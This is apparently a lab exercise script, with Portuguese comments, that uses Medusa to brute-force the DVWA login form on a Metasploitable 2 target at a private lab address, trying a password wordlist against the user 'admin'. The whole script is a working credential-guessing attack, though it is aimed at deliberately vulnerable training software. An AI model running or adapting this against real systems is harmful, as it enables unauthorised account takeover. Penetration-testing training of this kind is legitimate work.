#!/bin/bash
# Força bruta em formulário web DVWA via Medusa (módulo HTTP-GET)
# Requer DVWA rodando na Metasploitable 2 com security level: low
# Uso: ./03_dvwa_web_bruteforce.sh <IP_ALVO>

ALVO=${1:-"192.168.56.101"}
SENHAS="../wordlists/senhas_web.txt"

echo "[*] Iniciando força bruta web (DVWA) em $ALVO"
echo "[*] Usuário fixo: admin"
echo ""

# Medusa com módulo HTTP para formulário GET do DVWA
medusa -h "$ALVO" \
       -u admin \
       -P "$SENHAS" \
       -M http \
       -m "DIR:/dvwa/vulnerabilities/brute/" \
       -m "FORM:username=&password=&Login=Login" \
       -m "DENY:Username and/or password incorrect" \
       -t 1 \
       -f \
       -v 6

echo ""
echo "[*] Acesso web: http://$ALVO/dvwa/vulnerabilities/brute/"
